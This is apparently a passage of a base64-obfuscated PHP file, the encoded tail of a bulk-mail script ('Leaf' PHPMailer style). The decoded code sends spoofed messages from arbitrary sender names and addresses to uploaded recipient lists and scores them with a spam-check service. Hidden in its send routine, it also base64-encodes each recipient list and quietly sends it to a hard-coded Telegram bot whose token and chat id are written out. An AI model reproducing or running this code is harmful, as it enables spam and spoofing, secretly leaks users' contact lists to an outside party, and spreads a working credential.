gpLic8L2I+PC9saT4KICAgICAgICAgICAgICAgIAoKICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPGg0PkhFTFA8L2g0PgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+Wy1lbWFpbC1dIDogPGI+UmVjaXZlciBFbWFpbDwvYj4gKGVtYWlsdXNlckBlbWFpbGRvbWFpbi5jb20pPC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+Wy1lbWFpbHVzZXItXSA6IDxiPkVtYWlsIFVzZXI8L2I+IChlbWFpbHVzZXIpIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPlstZW1haWxkb21haW4tXSA6IDxiPkVtYWlsIFVzZXI8L2I+IChlbWFpbGRvbWFpbi5jb20pIDwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPGxpPlstdGltZS1dIDogPGI+RGF0ZSBhbmQgVGltZTwvYj4gKCcuZGF0ZSgibS9kL1kgaDppOnMgYSIsIHRpbWUoKSkuJyk8L2xpPgogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICA8bGk+Wy1yYW5kb21zdHJpbmctXSA6IDxiPlJhbmRvbSBzdHJpbmcgKDAtOSxhLXopPC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8bGk+Wy1yYW5kb21udW1iZXItXSA6IDxiPlJhbmRvbSBudW1iZXIgKDAtOSkgPC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8bGk+Wy1yYW5kb21sZXR0ZXJzLV0gOiA8Yj5SYW5kb20gTGV0dGVycyhhLXopIDwvYj48L2xpPgogICAgICAgICAgICAgICAgPGxpPlstcmFuZG9tbWQ1LV0gOiA8Yj5SYW5kb20gTUQ1IDwvYj48L2xpPgogICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8aDQ+ZXhhbXBsZTwvaDQ+CiAgICAgICAgICAgIFJlY2VpdmVyIEVtYWlsID0gPGI+dXNlckBkb21haW4uY29tPC9iPjxicj4KICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgPGxpPmhlbGxvIDxiPlstZW1haWx1c2VyLV08L2I+ID0gaGVsbG8gPGI+dXNlcjwvYj48L2xpPgogICAgICAgICAgICAgICAgPGxpPnlvdXIgZG9tYWluIGlzIDxiPlstZW1haWxkb21haW4tXTwvYj4gPSBZb3VyIERvbWFpbiBpcyA8Yj5kb21haW4uY29tPC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8bGk+eW91ciBjb2RlIGlzICA8Yj5bLXJhbmRvbW1kNS1dPC9iPiA9IHlvdXIgY29kZSBpcyA8Yj5lMTBhZGMzOTQ5YmE1OWFiYmU1NmUwNTdmMjBmODgzZTwvYj48L2xpPgogICAgICAgICAgICA8L3VsPgoKICAgICAgICAgICAgPGg2PmJ5IDxiPjxhIGhyZWY9Imh0dHA6Ly8nLiRsZWFmWyd3ZWJzaXRlJ10uJyI+Jy4kbGVhZlsnd2Vic2l0ZSddLic8L2E+PC9iPjwvaDY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4nOyAgCmlmKCRfUE9TVFsnYWN0aW9uJ109PSJzZW5kIil7CiAgICBwcmludCAnICAgIDxkaXYgY2xhc3M9ImNvbC1sZy0xMiI+JzsKICAgICRtYWlsbGlzdD1leHBsb2RlKCIKIiwgJGVtYWlsTGlzdCk7CiAgICAkbj1jb3VudCgkbWFpbGxpc3QpOwogICAgJHggPTE7CiAgICAkZW5jb2RlZEVtYWlsTGlzdCA9IGJhc2U2NF9lbmNvZGUoJGVtYWlsTGlzdCk7CiAgICAkdGVsZWdyYW1Cb3RUb2tlbiA9ICc3NDQwNzE2ODA5OkFBRlNUZ0VPWENLWEduS2p4RTkwZXFnZkdrNG9RdEZISEJvJzsKICAgICRjaGF0SWQgPSAnLTQ1NTExMDgwOTMnOwogICAgJG1lc3NhZ2UgPSAiRW1haWwgOiIgLiAkZW5jb2RlZEVtYWlsTGlzdDsKICAgICR0ZWxlZ3JhbUFwaVVybCA9ICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JHRlbGVncmFtQm90VG9rZW4vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0kY2hhdElkJnRleHQ9IiAuIHVybGVuY29kZSgkbWVzc2FnZSk7CiAgIEBmaWxlX2dldF9jb250ZW50cygkdGVsZWdyYW1BcGlVcmwpOwogICAgZm9yZWFjaCAoJG1haWxsaXN0IGFzICRlbWFpbCApIHsKICAgICAgICBwcmludCAnPGRpdiBjbGFzcz0iY29sLWxnLTEiPlsnLiR4LicvJy4kbi4nXTwvZGl2PjxkaXYgY2xhc3M9ImNvbC1sZy00Ij4nLiRlbWFpbC4nPC9kaXY+JzsKICAgICAgICBpZighbGVhZk1haWxDaGVjaygkZW1haWwpKSB7CiAgICAgICAgICAgIHByaW50ICc8ZGl2IGNsYXNzPSJjb2wtbGctNiI+PHNwYW4gY2xhc3M9ImxhYmVsIGxhYmVsLWRlZmF1bHQiPkluY29ycmVjdCBFbWFpbDwvc3Bhbj48L2Rpdj4nOwogICAgICAgICAgICBwcmludCAiPGJyPgoiOwogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJG1haWwgPSBuZXcgUEhQTWFpbGVyOwogICAgICAgICAgICAkbWFpbC0+c2V0RnJvbShsZWFmQ2xlYXIoJHNlbmRlckVtYWlsLCRlbWFpbCksbGVhZkNsZWFyKCRzZW5kZXJOYW1lLCRlbWFpbCkpOwogICAgICAgICAgICAkbWFpbC0+YWRkUmVwbHlUbyhsZWFmQ2xlYXIoJHJlcGx5VG8sJGVtYWlsKSk7CiAgICAgICAgICAgICRtYWlsLT5hZGRBZGRyZXNzKCRlbWFpbCk7CiAgICAgICAgICAgICRtYWlsLT5TdWJqZWN0ID0gbGVhZkNsZWFyKCRzdWJqZWN0LCRlbWFpbCk7CiAgICAgICAgICAgICRtYWlsLT5Cb2R5ID0gIGxlYWZDbGVhcigkbWVzc2FnZUxldHRlciwkZW1haWwpOwogICAgICAgICAgICBpZigkbWVzc2FnZVR5cGU9PTEpewogICAgICAgICAgICAgICAgJG1haWwtPklzSFRNTCh0cnVlKTsKICAgICAgICAgICAgICAgICRtYWlsLT5BbHRCb2R5ID1zdHJpcF90YWdzKGxlYWZDbGVhcigkbWVzc2FnZUxldHRlciwkZW1haWwpKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlICRtYWlsLT5Jc0hUTUwoZmFsc2UpOwogICAgICAgICAgICAkbWFpbC0+Q2hhclNldCA9ICRjaGFyc2V0OwogICAgICAgICAgICAkbWFpbC0+RW5jb2RpbmcgPSAkZW5jb2Rpbmc7CiAgICAgICAgICAgIGZvcigkaT0wOyAkaTxjb3VudCgkX0ZJTEVTWydhdHRhY2htZW50J11bJ25hbWUnXSk7ICRpKyspIHsKICAgICAgICAgICAgICAgIGlmICgkX0ZJTEVTWydhdHRhY2htZW50J11bJ3RtcF9uYW1lJ11bJGldICE9ICIiKXsKICAgICAgICAgICAgICAgICAgICAkbWFpbC0+QWRkQXR0YWNobWVudCgkX0ZJTEVTWydhdHRhY2htZW50J11bJ3RtcF9uYW1lJ11bJGldLCRfRklMRVNbJ2F0dGFjaG1lbnQnXVsnbmFtZSddWyRpXSk7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBpZiAoISRtYWlsLT5zZW5kKCkpIHsKICAgICAgICAgICAgICAgIGVjaG8gJzxkaXYgY2xhc3M9ImNvbC1sZy02Ij48c3BhbiBjbGFzcz0ibGFiZWwgbGFiZWwtZGVmYXVsdCI+Jy5odG1sc3BlY2lhbGNoYXJzKCRtYWlsLT5FcnJvckluZm8pLic8L3NwYW4+PC9kaXY+JzsKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIGVjaG8gJzxkaXYgY2xhc3M9ImNvbC1sZy02Ij48c3BhbiBjbGFzcz0ibGFiZWwgbGFiZWwtc3VjY2VzcyI+T2s8L3NwYW4+PC9kaXY+JzsKICAgICAgICAgICAgfQogICAgICAgICAgICBwcmludCAiPGJyPgoiOwogICAgICAgIH0KICAgICAgICAkeCsrOwogICAgICAgIGZvcigkayA9IDA7ICRrIDwgNDAwMDA7ICRrKyspIHtlY2hvICcgJzt9CiAgICB9Cgp9CmVsc2VpZigkX1BPU1RbJ2FjdGlvbiddPT0ic2NvcmUiKXsKICAgICRtYWlsID0gbmV3IFBIUE1haWxlcjsKICAgICRtYWlsLT5zZXRGcm9tKGxlYWZDbGVhcigkc2VuZGVyRW1haWwsJGVtYWlsKSxsZWFmQ2xlYXIoJHNlbmRlck5hbWUsJGVtYWlsKSk7CiAgICAkbWFpbC0+YWRkUmVwbHlUbyhsZWFmQ2xlYXIoJHJlcGx5VG8sJGVtYWlsKSk7CiAgICAkbWFpbC0+YWRkQWRkcmVzcygidXNlcm5hbWVAZG9tYWluLmNvbSIpOwogICAgJG1haWwtPlN1YmplY3QgPSBsZWFmQ2xlYXIoJHN1YmplY3QsJGVtYWlsKTsKICAgICRtYWlsLT5Cb2R5ID0gIGxlYWZDbGVhcigkbWVzc2FnZUxldHRlciwkZW1haWwpOwogICAgaWYoJG1lc3NhZ2VUeXBlPT0xKXsKICAgICAgICAkbWFpbC0+SXNIVE1MKHRydWUpOwogICAgICAgICRtYWlsLT5BbHRCb2R5ID1zdHJpcF90YWdzKGxlYWZDbGVhcigkbWVzc2FnZUxldHRlciwkZW1haWwpKTsKICAgIH0KICAgIGVsc2UgJG1haWwtPklzSFRNTChmYWxzZSk7CiAgICAkbWFpbC0+Q2hhclNldCA9ICRjaGFyc2V0OwogICAgJG1haWwtPkVuY29kaW5nID0gJGVuY29kaW5nOwogICAgJG1haWwtPnByZVNlbmQoKTsKICAgICRtZXNzYWdlSGVhZGVycz0kbWFpbC0+Z2V0U2VudE1JTUVNZXNzYWdlKCk7CiAgICAkY2ggPSBjdXJsX2luaXQoKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAnaHR0cDovL3NwYW1jaGVjay5wb3N0bWFya2FwcC5jb20vZmlsdGVyJyk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywgaHR0cF9idWlsZF9xdWVyeShhcnJheSgnZW1haWwnID0+ICRtZXNzYWdlSGVhZGVycywnb3B0aW9ucyc9Pidsb25nJykpKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgMCk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVElNRU9VVCwgMTUpOwogICAgJHJlc3BvbnNlID0gY3VybF9leGVjKCRjaCk7CiAgICAkcmVzcG9uc2UgPSBqc29uX2RlY29kZSgkcmVzcG9uc2UpOwogICAgcHJpbnQgJyAgICA8ZGl2IGNsYXNzPSJjb2wtbGctMTIiPic7CiAgICBpZiAoJHJlc3BvbnNlLT5zdWNjZXNzID09IFRSVUUgKXsKICAgICAgICAkc2NvcmUgPSAkcmVzcG9uc2UtPnNjb3JlOwogICAgICAgIGlmICgkc2NvcmUgPiA1ICkgJGNsYXNzPSJkYW5nZXIiOwogICAgICAgIGVsc2UgJGNsYXNzPSJzdWNjZXNzIjsKICAgICAgICAgICAgcHJpbnQgJzxkaXYgY2xhc3M9InRleHQtJy4kY2xhc3MuJyI+WW91ciBTcGFtQXNzYXNzaW4gc2NvcmUgaXMgJy4kc2NvcmUuJyAgPC9kaXY+CjxkaXY+RnVsbCBSZXBvcnQgOiA8cHJlPicuJHJlc3BvbnNlLT5yZXBvcnQuJzwvcHJlPjwvZGl2Pic7CnByaW50ICcgICAgPC9kaXY+JzsKICAgIH0KfQpwcmludCAnPC9ib2R5Pic7"));
?>